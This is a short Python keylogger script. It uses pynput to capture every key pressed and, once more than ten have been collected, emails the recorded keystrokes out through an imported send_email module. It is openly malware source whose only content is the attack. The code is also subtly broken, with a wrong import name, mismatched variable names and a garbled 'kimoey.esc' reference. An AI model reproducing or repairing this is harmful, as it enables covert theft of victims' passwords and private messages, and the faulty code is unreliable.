import pynput
from pynput.keyboard import key, Listener
import send_email

count =0
keys=[]

def on_press(Key):
    print(key, end=" ")
    print("pressed")
    global keys,count
    keys.append(str(key))
    count += 1
    if count >10:
        count=0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k=key.replace("'","")
        if key == "Key.space":
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)

def on_release(key):
    if key ==kimoey.esc:
        return False
with Listener(on_press = on_press, on_release=on_release)  as listener:
          listener.join()
